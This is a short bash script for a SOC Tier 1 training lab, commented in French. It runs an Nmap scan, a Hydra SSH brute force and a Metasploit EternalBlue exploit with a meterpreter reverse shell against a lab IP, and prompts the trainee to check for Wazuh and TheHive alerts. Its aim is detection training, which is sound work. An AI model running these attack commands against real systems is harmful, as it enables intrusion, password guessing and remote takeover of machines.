#!/bin/bash
# Script de simulation d'attaques — SOC Tier 1 Lab
# AVERTISSEMENT: À utiliser UNIQUEMENT dans un environnement de lab isolé

TARGET_IP="192.168.1.50"
KALI_IP="192.168.1.100"

echo "========================================="
echo "  SOC Tier 1 — Simulation d'attaques"
echo "========================================="
echo ""

# Scénario 1 : Reconnaissance réseau
echo "[*] Scénario 1 : Scan Nmap (T1046 - Network Service Discovery)"
nmap -sV -O -p 22,80,443,445,3389 $TARGET_IP -oN scan_results.txt
echo "[✓] Scan terminé — Vérifier alerte Wazuh règle 100001"
sleep 5

# Scénario 2 : Brute Force SSH
echo ""
echo "[*] Scénario 2 : Brute Force SSH (T1110 - Brute Force)"
hydra -l admin -P /usr/share/wordlists/rockyou_mini.txt ssh://$TARGET_IP -t 4 -f 2>/dev/null | head -20
echo "[✓] Brute force terminé — Vérifier alerte Wazuh règle 100002"
sleep 5

# Scénario 3 : Exploitation Metasploit
echo ""
echo "[*] Scénario 3 : Exploitation MS17-010 EternalBlue (T1210)"
msfconsole -q -x "
  use exploit/windows/smb/ms17_010_eternalblue;
  set RHOSTS $TARGET_IP;
  set LHOST $KALI_IP;
  set PAYLOAD windows/x64/meterpreter/reverse_tcp;
  run;
  exit
" 2>/dev/null
echo "[✓] Exploitation terminée — Vérifier alerte TheHive"

echo ""
echo "========================================="
echo "  Simulation terminée. Analyser Kibana."
echo "========================================="
